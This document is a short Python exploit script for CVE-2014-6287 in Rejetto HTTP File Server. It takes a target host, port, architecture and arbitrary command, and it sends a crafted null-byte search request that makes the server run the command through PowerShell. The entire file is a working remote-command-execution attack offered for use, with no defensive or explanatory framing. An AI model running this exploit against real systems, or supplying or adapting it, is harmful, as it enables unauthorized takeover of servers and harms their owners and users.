#!/usr/bin/python3

# This script executes powershell commands on systems running Rejetto HTTP File Server.

# Usage: ./CVE-2014-6287.py <RHOST> <RPORT> <ARCHITECTURE e.g. x32> <COMMAND>

import requests
import sys


try:
    HOST = sys.argv[1]
    IP = sys.argv[2]
    os = sys.argv[3]
    command = sys.argv[4:]
    command = "+".join(command)
except:
    print("Usage: ./CVE-2014-6287.py <RHOST> <RPORT> <ARCHITECTURE e.g. x32> <COMMAND>")
    exit(1)

if os == "x32":
    ps_location = "System32"
elif os == "x64":
    ps_location = "sysnative"
else:
    print("CPU architecture not recognised.")
    exit(1)

payload = "%00{.exec|C%3a\Windows\\" + ps_location + r"\WindowsPowerShell\v1.0\powershell.exe+" + command + ".}"

print("\nrequest: " + fr"http://{HOST}:{IP}/?search={payload}")

try:
    res = requests.get(fr"http://{HOST}:{IP}/?search={payload}")
except:
    print("\nExploit unsuccessful.")
    exit(0)

print("Request Sent.")

